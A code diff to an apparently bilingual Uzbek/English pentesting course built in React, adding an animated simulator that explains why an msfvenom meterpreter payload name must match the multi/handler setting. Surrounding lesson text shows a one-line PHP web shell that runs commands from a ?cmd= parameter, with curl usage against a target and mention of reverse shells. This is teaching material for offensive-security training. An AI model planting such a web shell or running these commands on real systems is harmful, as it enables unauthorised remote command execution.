@@ -1108,6 +1108,46 @@ function ShellConnectSim(){
       React.createElement("button",{onClick:()=>{setRun("reverse");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reverse"?A+"22":SL2,color:run==="reverse"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Reverse shell","✅ Reverse shell"))));
 }
 
+function PayloadHandlerSim(){
+  const lang=useLang();
+  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
+  const MISMATCH=[
+    {col:BL,uz:"msfvenom bilan windows/x64/meterpreter/reverse_tcp (STAGED) yaratildi",en:"A STAGED windows/x64/meterpreter/reverse_tcp payload is generated with msfvenom",duz:"Eslatma: nomida slesh (/) bor — bu staged.",den:"Note: the name has a slash (/) — that's staged."},
+    {col:AM,uz:"Handler'da: set payload windows/x64/meterpreter_reverse_tcp — pastki chiziq bilan (xato!)",en:"In the handler: set payload windows/x64/meterpreter_reverse_tcp — with an underscore (a mistake!)",duz:"Bitta belgi farqi — lekin bu butunlay boshqa payload turi.",den:"One character different — but it's a completely different payload type."},
+    {col:AM,uz:"Nishonda ishga tushirilganda: dastlabki stage yuboriladi, lekin handler uni tushunmaydi",en:"When run on the target: the initial stage is sent, but the handler doesn't understand it",duz:"Ikki tomon boshqa-boshqa «tilda» gaplashmoqda.",den:"The two sides are speaking different «protocols»."},
+    {col:D,uz:"❌ Ulanish darhol uziladi — sessiya ochilmaydi",en:"❌ The connection drops immediately — no session opens",duz:"msfvenom'ning o'zi to'g'ri ishlagan bo'lsa ham, mos kelmaslik hammasini buzadi.",den:"Even though msfvenom itself worked correctly, the mismatch breaks everything.",final:true,bad:true}
+  ];
+  const MATCH=[
+    {col:BL,uz:"msfvenom bilan windows/x64/meterpreter/reverse_tcp (STAGED) yaratildi",en:"The exact same STAGED windows/x64/meterpreter/reverse_tcp payload is generated",duz:"Xuddi shu payload, xuddi shu buyruq.",den:"The exact same payload, the exact same command."},
+    {col:AM,uz:"Handler'da: set payload windows/x64/meterpreter/reverse_tcp — msfvenom bilan AYNAN bir xil",en:"In the handler: set payload windows/x64/meterpreter/reverse_tcp — EXACTLY matching msfvenom",duz:"Harfma-harf, sleshigacha bir xil qatorlar.",den:"Character for character, down to the slashes — identical strings."},
+    {col:AM,uz:"Nishonda ishga tushirilganda: stage yuboriladi, handler uni to'g'ri kutib oladi",en:"When run on the target: the stage is sent, and the handler receives it correctly",duz:"Ikki tomon bir xil «tilda» gaplashmoqda.",den:"Both sides speak the same «protocol»."},
+    {col:A,uz:"✅ Meterpreter sessiyasi muvaffaqiyatli ochiladi",en:"✅ A Meterpreter session opens successfully",duz:"Payload nomi — belgisiga qadar mos kelishi shart bo'lgan «kalit».",den:"The payload name is a «key» that must match down to the last character.",final:true}
+  ];
+  const [run,setRun]=useState(null);
+  const [step,setStep]=useState(-1);
+  useEffect(()=>{
+    if(run==null){setStep(-1);return;}
+    const list=run==="mismatch"?MISMATCH:MATCH;
+    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
+    if(step>=list.length-1) return;
+    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
+  },[run,step]);
+  const list=run==="mismatch"?MISMATCH:run==="match"?MATCH:null;
+  const cur=list&&step>=0?list[step]:null;
+  return React.createElement("div",{style:{margin:"14px 0"}},
+    React.createElement("div",{style:{minHeight:50}},
+      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu payload handler'dagi nom bilan mos kelganda va kelmaganda nima bo'lishini ko'ring.","⬇ Pick a scenario — see what happens when the same payload's name matches the handler versus when it doesn't.")):
+      list.map(function(s,i){ if(step<i) return null;
+        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
+          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
+          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
+    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
+      run==="mismatch"?t(lang,"✗ Mos kelmagan nom: staged/stageless chalkashtirildi","✗ Mismatched name: staged/stageless got mixed up"):t(lang,"✓ Aniq mos nom: sessiya muvaffaqiyatli ochildi","✓ Exact match: the session opened successfully")),
+    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
+      React.createElement("button",{onClick:()=>{setRun("mismatch");setStep(-1);},style:{flex:1,padding:"9px",background:run==="mismatch"?D+"22":SL2,color:run==="mismatch"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Mos kelmagan payload","❌ Mismatched payload")),
+      React.createElement("button",{onClick:()=>{setRun("match");setStep(-1);},style:{flex:1,padding:"9px",background:run==="match"?A+"22":SL2,color:run==="match"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Aniq mos payload","✅ Exact-match payload"))));
+}
+
 function LessonL01(){
   const lang=useLang();
   return React.createElement("section",null,
@@ -2286,7 +2326,10 @@ function LessonL22(){
     React.createElement(SlideImg,{src:"msfvenom/msf_s08.png",cap:"exploit(multi/handler) > options — payload, LHOST va LPORT parametrlari sozlanadi.",capEn:"exploit(multi/handler) > options — the payload, LHOST and LPORT options are configured."}),
     React.createElement(SlideImg,{src:"msfvenom/msf_s10.png",cap:"Nishonda payload ishga tushgach, multi/handler ulanishni qabul qiladi va teskari qobiq beradi.",capEn:"Once the payload runs on the target, multi/handler accepts the connection and yields a reverse shell."}),
     React.createElement(SlideImg,{src:"msfvenom/msf_s11.png",cap:"multi/handler bosqichli yukni ushlaydi: sessiya ochiladi, sessions 1 bilan unga o'tamiz (Windows administrator).",capEn:"multi/handler catches the staged payload: a session opens; sessions 1 switches to it (Windows administrator)."}),
-    React.createElement(H2,{num:"§8"},t(lang,"Web shells (veb-qobiqlar)","Web shells")),
+    React.createElement(H2,{num:"§8"},t(lang,"Interaktiv simulyator: payload nomi handler bilan mos kelishi shart","Interactive simulator: the payload name must match the handler")),
+    React.createElement(P,null,t(lang,"§4 va §7 dagi ogohlantirishni his qiling — bitta belgi farqi (slesh vs pastki chiziq) hamma narsani buzishi mumkin:","Feel the §4 and §7 warning for yourself — a single character difference (slash vs underscore) can break everything:")),
+    React.createElement(PayloadHandlerSim),
+    React.createElement(H2,{num:"§9"},t(lang,"Web shells (veb-qobiqlar)","Web shells")),
     React.createElement(P,null,t(lang,"Ba'zan biz fayl yuklashga ruxsat beruvchi veb-saytga duch kelamiz, lekin to'liq teskari shell yuklab bo'lmaydi. Bunday holda web shell yuklaymiz — bu veb-server ichida ishlaydigan va serverda buyruq bajaradigan kichik skript (odatda PHP yoki ASP). Buyruqlar URL orqali (?cmd=) yoki HTML forma orqali kiritiladi, skript ularni bajaradi va natijani sahifaga qaytaradi. Kali'da tayyor web shell'lar /usr/share/webshells katalogida bor (masalan mashhur PentestMonkey php-reverse-shell). Windows nishonlarda ko'pincha URL formatida kodlangan PowerShell reverse shell ishlatiladi.","Sometimes we meet a website that allows file upload but a full reverse shell can't be uploaded. In that case we upload a web shell — a small script (usually PHP or ASP) that runs inside the web server and executes commands on it. Commands are passed via the URL (?cmd=) or an HTML form, the script runs them and returns the result to the page. Kali has ready web shells in /usr/share/webshells (e.g. the famous PentestMonkey php-reverse-shell). On Windows targets a URL-encoded PowerShell reverse shell is often used.")),
     React.createElement(Terminal,null,"# Eng oddiy PHP web shell (bir qatorli):\n<?php echo \"<pre>\" . shell_exec($_GET[\"cmd\"]) . \"</pre>\"; ?>\n\n# Foydalanish (brauzerda yoki curl bilan):\n# http://nishon/shell.php?cmd=id\n# http://nishon/shell.php?cmd=whoami\ncurl \"http://nishon/shell.php?cmd=ifconfig\"\n\n# Kali'dagi tayyor web shell'lar:\nls /usr/share/webshells/php/"),
     React.createElement(SlideImg,{src:"msfvenom/msf_s13.png",cap:"PHP web shell amalda: URL'dagi ?cmd= parametri orqali nishonda buyruq bajariladi.",capEn:"A PHP web shell in action: a command runs on the target via the ?cmd= parameter in the URL."}),
